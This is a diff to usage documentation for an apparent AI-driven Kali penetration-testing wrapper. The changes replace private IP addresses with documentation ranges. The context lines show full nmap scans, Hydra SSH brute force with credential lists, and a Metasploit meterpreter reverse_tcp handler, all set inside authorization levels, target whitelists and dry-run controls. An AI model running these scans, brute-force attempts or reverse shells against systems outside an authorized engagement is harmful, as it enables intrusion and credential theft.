@@ -81,14 +81,14 @@ authorized, msg = agent.check_authorization("nmap")
 ### IP Whitelist/Blacklist
 ```python
 # Only allow specific targets
-agent.set_ip_whitelist(["192.168.1.0/24", "10.0.0.100"])
+agent.set_ip_whitelist(["192.0.2.0/24", "198.51.100.100"])
 
 # Always block specific targets
-agent.add_to_blacklist("192.168.1.1")  # Gateway
+agent.add_to_blacklist("192.0.2.1")  # Gateway
 agent.add_to_blacklist("8.8.8.8")  # External
 
 # Validate target manually
-valid, msg = agent.validate_target("192.168.1.50")
+valid, msg = agent.validate_target("192.0.2.50")
 ```
 
 ### Audit Logging
@@ -253,9 +253,9 @@ for module in modules[:10]:
 job = agent.execute_metasploit_exploit(
     exploit="exploit/multi/handler",
     payload="payload/meterpreter/reverse_tcp",
-    target="192.168.1.100",
+    target="192.0.2.100",
     options={
-        "LHOST": "192.168.1.50",
+        "LHOST": "192.0.2.50",
         "LPORT": 4444,
     }
 )
@@ -307,7 +307,7 @@ class MetasploitSession:
 result = agent.execute_tool(
     tool_name="nmap",
     arguments={
-        "target": "192.168.1.0/24",
+        "target": "192.0.2.0/24",
         "ports": "1-65535",
         "version_detect": True,
         "os_detect": True,
@@ -360,7 +360,7 @@ result = agent.john_crack(
 
 # Hydra brute force
 result = agent.hydra_bruteforce(
-    target="192.168.1.100",
+    target="192.0.2.100",
     service="ssh",
     userlist="/tmp/users.txt",
     passlist="/tmp/passwords.txt"
@@ -409,7 +409,7 @@ agent.disable_safe_mode()
 # Enable dry-run (commands logged but not executed)
 agent.enable_dry_run()
 
-result = agent.nmap_scan(target="192.168.1.1")
+result = agent.nmap_scan(target="192.0.2.1")
 print(result.stdout)  # "[DRY-RUN] Command would execute: nmap ..."
 
 # Disable dry-run
@@ -497,7 +497,7 @@ Total Executions: 15
 ```python
 # Execute Nmap with XML output
 result = agent.execute_tool("nmap", {
-    "target": "192.168.1.0/24",
+    "target": "192.0.2.0/24",
     "output_xml": "/tmp/scan.xml"
 })
 
@@ -508,7 +508,7 @@ parsed = agent._parse_nmap_xml(result.stdout)
 {
     "hosts": [
         {
-            "address": "192.168.1.1",
+            "address": "192.0.2.1",
             "hostname": "gateway.local",
             "ports": [
                 {"port": 22, "protocol": "tcp", "state": "open", "service": "ssh"},
@@ -550,7 +550,7 @@ engagement = redteam.create_engagement(
     name="External Penetration Test",
     engagement_type=EngagementType.PENETRATION_TEST,
     start_date=datetime.utcnow(),
-    scope=["192.168.1.0/24"],
+    scope=["192.0.2.0/24"],
     objectives=["Identify vulnerabilities", "Test defenses"]
 )
 
@@ -560,7 +560,7 @@ kali.set_authorization(AuthorizationLevel.ADVANCED)
 # Execute reconnaissance
 kali.enable_dry_run()
 nmap_result = kali.nmap_scan(
-    target="192.168.1.0/24",
+    target="192.0.2.0/24",
     ports="1-65535"
 )
 kali.disable_dry_run()
@@ -573,7 +573,7 @@ kali.set_authorization(AuthorizationLevel.CRITICAL)
 metasploit_job = kali.execute_metasploit_exploit(
     exploit="exploit/multi/handler",
     payload="payload/meterpreter/reverse_tcp",
-    target="192.168.1.100"
+    target="192.0.2.100"
 )
 
 # Add finding from Metasploit session
@@ -597,11 +597,11 @@ kali_report = kali.generate_report(engagement_id=engagement.engagement_id)
 
 ```python
 # ❌ Wrong - No authorization
-result = agent.execute_tool("nmap", {"target": "192.168.1.1"})
+result = agent.execute_tool("nmap", {"target": "192.0.2.1"})
 
 # ✅ Correct - Set appropriate level
 agent.set_authorization(AuthorizationLevel.BASIC)
-result = agent.execute_tool("nmap", {"target": "192.168.1.1"})
+result = agent.execute_tool("nmap", {"target": "192.0.2.1"})
 ```
 
 ### 2. Use Dry-Run for Testing
